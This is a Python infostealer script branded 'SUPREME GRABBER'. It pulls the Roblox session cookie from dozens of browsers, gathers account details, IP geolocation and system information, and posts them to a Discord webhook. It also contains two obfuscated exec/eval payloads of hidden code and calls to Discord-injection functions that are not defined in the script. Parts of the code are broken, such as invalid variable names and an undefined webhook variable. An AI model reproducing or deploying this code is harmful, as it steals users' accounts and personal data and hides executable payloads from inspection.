import requests
import browser_cookie3
import json
import psutil
import platform
import wmi
import robloxpy
import os
import re
from pathlib import Path

##### OBFUSCATED TO PROTECT AGAINST STEALERS #######

#pip install pycryptodome  , It works only v3.11 Above.
import random ,base64,codecs,zlib;pyobfuscate=""

obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(builtins)'],['''(Zr&p1E^XEu`^!*oX?BmMi-IUVaUacYTUy?L#)DWntvzwCMPgyB<sJ`C9V<-{f^T!4?|SHpI5G<7_j+bW_}MDpL2W=m-$m|_OSdmy}~#1!P-{c5TTQeA(dkw?lvuF-O<@W(8Enh(t~oMH!G`=+_e}VO`4Z1{y+!1`n*8M$C9|L$7FXjMK3h'''.replace('\n','')]))

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
                
discordwebhook = 'WEBHOOK HERE'

cookies = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'torch', 'maxthon', 'iridium', 'comodo', 'seamonkey', 'palemoon', 'waterfox', 'basilisk', 'safari', 'internet explorer', 'netscape', 'avant browser', 'camino', 'flock', 'galeon', 'k-meleon', 'lynx', 'midori', 'mosaic', 'nokia browser', 'omniweb', 'puffin', 'rockmelt', 'slimjet', 'srware iron', 'uc browser', 'webtv', 'whale', 'yuzu', 'zohocorp', '360 secure browser', 'amigo', 'apache', 'apple webkit', 'arora', 'beaker browser', 'blisk', 'browzar', 'citrio', 'coccoc', 'colibri', 'coolnovo', 'cyberfox', 'deepnet explorer', 'dillo', 'dooble', 'dorothy browser', 'epic browser', 'fennec', 'flock', 'fluid', 'gnome web', 'googlebot', 'google earth', 'hotjava', 'iceape', 'icecat', 'iceweasel', 'jack', 'kazehakase', 'kipi', 'k-meleon goanna', 'konqueror', 'leopard webkit', 'links', 'lunascape', 'microsoft edge mobile', 'microsoft webmatrix', 'min', 'minimo', 'minuet', 'mozilla suite', 'netsurf', 'nutscrape', 'omniweb', 'orca browser', 'phoenix', 'pogo', 'qutebrowser', 'qtweb', 'rockmelt', 'salamweb', 'samsung internet', 'shiira', 'songbird', 'surf', 'swiftfox', 'tenfourfox', 'the world browser', 'uzbl', 'vortex', 'web', 'webian shell', 'webpositive', 'wget', 'wxweb', 'xombrero', 'yellow', 'avast', 'tor']



def get():
    for browser in cookies:
        try:
            browsers = getattr(browser_cookie3, browser)(domain_name='roblox.com')
            for cookie in browsers:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except:
            pass
    return None

roblox = get() or "No Roblox Cookie Found"


headers = {
   'Cookie': '.ROBLOSECURITY=' + roblox,
   'User-Agent': 'Roblox/WinInet',
   'Referer': 'https://www.roblox.com/'
}

Supreme-Grabber-Builder = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers).json()
username = Supreme-Grabber-Builder.get('UserName', 'Not found')
user_id = Supreme-Grabber-Builder.get("UserID", 'Not found')
robux_balance = Supreme-Grabber-Builder.get('RobuxBalance', 'Not found')
rap = robloxpy.User.External.GetRAP(user_id) if user_id else 'Not found'
premium = Supreme-Grabber-Builder.get('IsPremium', 'Not found')
creation = robloxpy.User.External.CreationDate(user_id) if user_id else 'Not found'
data = {
    "username": "Cookie Logger 40+ Browser Support",
    "avatar_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662",
    "embeds": [
        {
            "title": "SUPREME GRABBER - LOLL",
            "url": "https://pornhub.com",
            "description": "",
            "color": 3447704,
            "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
            "author": {
                "name": "Roblox Shit ig lmao idfk",
                "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
            },
            "fields": [
                {"name": "Roblox Cookie 🍪", "value": "```" + roblox + "```", "inline": False},
                {"name": "Username 🪪", "value": "```" + str(username) + "```", "inline": True},
                {"name": "Premium 💎", "value": "```" + str(premium) + "```", "inline": True},
                {"name": "ID 🪪", "value": "```" + str(user_id) + "```", "inline": True},
                {"name": "Robux 💰", "value": "```" + str(robux_balance) + "```", "inline": True},
                {"name": "RAP 💰", "value": "```" + str(rap) + "```", "inline": True},
                {"name": "Creation 📆", "value": "```" + str(creation) + "```", "inline": True},
            ]
        }
    ]
}

headers = {'Content-type': 'application/json'}
response = requests.post(webhook, data=json.dumps(data), headers=headers) 

response = requests.get("http://ipinfo.io/json")
jjzino = response.json()

embed = {
    "title": "SUPREME LOGGER - LOLL",
    "url": "https://pornhub.com",
    "description": "",
    "color": 3447704,
    "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
    "author": {
        "name": "Ip info bro do i really need to label this?",
        "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
    },
    "fields": [
        {"name": "IP :globe_with_meridians: ", "value": f"```{jjzino['ip']}```", "inline": False},
        {"name": "City :globe_with_meridians: ", "value": f"```{jjzino['city']}```", "inline": True},
        {"name": "Region :globe_with_meridians: ", "value": f"```{jjzino['region']}```", "inline": True},
        {"name": "Country :globe_with_meridians: ", "value": f"```{jjzino['country']}```", "inline": True},
        {"name": "Hostname :globe_with_meridians: ", "value": f"```{jjzino['hostname']}```", "inline": False},
        {"name": "Org :globe_with_meridians: ", "value": f"```{jjzino['org']}```", "inline": False},
        {"name": "Latitude :globe_with_meridians: ", "value": f"```{jjzino['loc'].split(',')[0]}```", "inline": True},
        {"name": "Longitude :globe_with_meridians: ", "value": f"```{jjzino['loc'].split(',')[1]}```", "inline": True},
        {"name": "Timezone :globe_with_meridians: ", "value": f"```{jjzino['timezone']}```", "inline": False}
    ]
}

payload = {
    "username": "IP INFO - SUPREME LOGGER",
    "avatar_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662",
    "embeds": [embed]
}
headers = {"Content-Type": "application/json"}
response = requests.post(webhook, json=payload, headers=headers)

os = f"{platform.system()} {platform.release()}"
cpu = f"{platform.processor()} ({psutil.cpu_count()} cores)"
ram = psutil.virtual_memory().total // (1024 ** 3)
ramu = f"{round(psutil.virtual_memory().used / (1024 ** 3))} GB ({psutil.virtual_memory().percent}%)"
diski = ""
for disk in psutil.disk_partitions():
    if "cdrom" not in disk.opts and "removable" not in disk.opts:
        disk_name = disk.device.split(":")[0]
        disk_usage = psutil.disk_usage(disk.device)
        diski += f"{disk_name}: {round(disk_usage.total / (1024 ** 3))} GB\n"
gpu = ""
for gpu in wmi.WMI().Win32_VideoController():
    gpu = gpu.Name + "\n"
desktop_info = platform.uname()[2]

embed = {
    "title": "SYSTEM INFO - SUPREME GRABBER",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "author": {
        "name": "Lol system shit idk!",
        "icon_url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"
    },
    "fields": [
        {"name": "OS :desktop:", "value": f"```{os}```", "inline": False},
        {"name": "CPU :dvd:", "value": f"```{cpu}```", "inline": False},
        {"name": "RAM :dvd:", "value": f"```{ram} GB```", "inline": True},
        {"name": "RAM Usage :dvd:", "value": f"```{ramu}```", "inline": True},
        {"name": "Storage :printer:", "value": f"```{diski}```", "inline": True},
        {"name": "Desktop :computer:", "value": f"```{desktop_info}```", "inline": False}
    ]
}

response = requests.post(webhook, json={"embeds": [embed]})


##### OBFUSCATED TO PROTECT CODE FROM STEALERS #####

#pip install pycryptodome  , It works only v3.11 Above.
import random ,base64,codecs,zlib;pyobfuscate=""

obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''Q*)2?i<?$~$=-?IT&;P@Ptkh;-RzO*NI&by$9L>lYM^aiEu2PhNe@DTdff-w88^cRP~P8Fp(!Dhtrr;1hBEu53gR!!3Pjy?J7o7fUjjQhq0$LuTNi68-Sn2?#k(|GWl&795nG#MCR(E04n9s)H8P1n4mw2_&`})%4I`1;ZWk98Cp#9KV(@gAM^qiD^=YDTS@y=MlA%8j5o4vKAD$b=V7cYXpMAu5&04)98OT|snAW+%`7OdRvv*LLK>hzPm!C{l##$-54jzo0)`9K7M7}6t0D2)|8Gjjw1v3i<zqz*2^&CsHx^TbFv$F>MXL1ayhTf}qXzq2$7oal{+M(2Z>Rd57si*jT^sXsGI$;!}MasKaMd|&;E_c3nY|Kl=s4en#Ci@M@I1}0v#o4OLB!)yEYNNnXG6(OqeDzIGcxJBgNU|8OMzdL{tv4}P>XdiC*CDO9#6dC1>-D7VCX`D2(Oe}+5;kWWIO7#<{&|bR#WY$ZUMwd3hFH3Qv<ct)Dnh2yh@$cE`o>}mHa8dY!)ji7MrmOxKgb}Mcl4<C-Fnfb>fOcp;mL4=efevxY3T2N89*bdA00x=I7|?H2dMQTr?WpTv7t0)g+lr{6t9=er2B<{TP$BK@Y#s+7f{KQjh9Udbd-L_NO7CO#3B<wrlDJ^itwEHn7~LznwHk8wcSFo-!IF9b`+k(v^a13Fg+oWbY5CJ@bWuC<;<^${N|dTs%aO@U?zET(8+Vi$3uN`m2-{R{DSLRmdU|2_zh@@EW||<^lWu53Gh1~p%2s4`O*KS%gHeGc(d5<Tc1lzRgx=C`8`kUDP#e(r8`f#L<T!hh{<>#42)3Sq5&tDJWuS@jRh$AWAU8zZ#x`y1>><=l{tyCgDyi06x#P{-c-h?S0?EhF}n2EBhQ)vms(qz3FQ3jfl_)b@}WPK>ZC|Adsbc;LLZViw`riHfx020`hYInY7qaZ7j2PvmH5>qO`BoKAG=xR{v40oa5q=GBIYC&<mZ0>C5`T<A`#TygLbJlR7`K7SK;t@=Xb%|mjAAUI&zuOk7E1PjQ1*}Cpw=9cFbf-P9HdZ{$cRdq-n^0LPBXRYG*Iv=8eF}?~d2|%Y?~wFw8c5ZdxZAvpO>ZnQI#oUaBBLVmA^7$fDi6L91>pKwe-~e#)Z~MfWCQk=E~jv69O?`Nv(~djI*ElWTS|z0SGaesZ$;x@5+(Iit)OVd|$^n`z@K@tv#xdlkP?%ezv`Q0ntKWFxT_VFI|Rg}^bq#7(RSd1YogZteEocv*=16U9|glCo{-6q<cJll>2_yZt(nSVuW~Ig;YDbtQd6p9bbi11^9(He<>UD<5qRVCZaO9a}{+UA45?WOgAtEsChr*J38vmO#?VbZab){Zl)IzUPxzudYMpL&qmV#~En3Vlr{zz&Y0Zfo}SYpR)f|LU3Trd^G0L%z&X0RXb)$38WE$vnn*+1=A9D`^-7Rn99%7Qz@le5bX)f3$3SiJ-Du(w-yt~M}2Lg;TPSWvl?zNCDsTPEST1r6!zZDH}Gp3w^PV1CT117^?`5PW%VUypWreE@RM*&ZM%zo`;8k4R3jnJ=(XM9QP2s8>KEfyw?=+x%%$sQ>VAqiQgJ<<K`-##Ac0L`eWUqC)+nwmQlN#Q(0?7wxy>;?*?tj$3uAO_G(k&Z;Ir2(Rr#psrd1C;Z@Ad*M(E|Ps8&HjC?vg~1k^Wn>=QHLta#Z#;VP`M9I{1`lG8;T;370FDTBFDs(p_r;lc6K315)LLGg?B%8rH7Iq@&~CjXsmEv5;%GPhU|BqV1V#-9SVbIG@G-Pz5aE4XZdQ~&7s-H3v$*NtnmWd>~N#|JC=9C7A2jx;Yj<@Xewa7!0z94ZHW*Gn3fHYrDd;JG4-*8WSca)GJOI>By^yJ)a!Zap!TgOV}tb)8Y2>UO8PC(<wNO^a~$;ZIr^=L!rWT1a#@UviYw(-IbgBu8(L)vXS9b}RGw)&306v#{$Ve#N+LUhv^1^1lT5a*^49c9}SiUrd&&c)3pe?2}A#T_b)7Y2Z8npfq15j6bs3tULvIQ^D4HI{pq5seh2|m3QiKP=Z|S=881OVS@5EtP!4afQEfGf@DWO;O=MRuHR#xVProIFFe8lIq9*t+vY$uo+*K!Y&>+owNka64uEy!GsyU6(N33BVs>{7oP5W(qi@!6SAL8qn>E{F@ZI$XY9FDND%A|0b+peJiLFMCA0j)*Hv3eF2!92K@?C|ypDYimuy>C2Vm#a2_wkei)ZV(epL-#?uby$J5exx{J+sX4BC>9gOP3PZw}Uv?FG3G0&$JrmwLknceWz~nnrN_>XkAy1SaUI8k)8'''.replace('\n','')]))

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
                
embed = {
    "title": "💉 Discord Injection - SUPREME LOGGER 💉",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "fields": [
        {"name": "Injection Status", "value": f"```Discord Has been Injected in LOCALAPPDATA```", "inline": False},
    ]
}

response = requests.post(webhook, json={"embeds": [embed]})
inject_discord()
kill_discord()



embed = {
    "title": "Note ✅",
    "color": 3447704,
    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
    "fields": [
        {"name": "SUPREME GRABBER", "value": f"""```Best grabber in the world SUPREME GRABBER
SUPREME ON TOP```""", "inline": False},
    ]
}
response = requests.post(webhook, json={"embeds": [embed]})

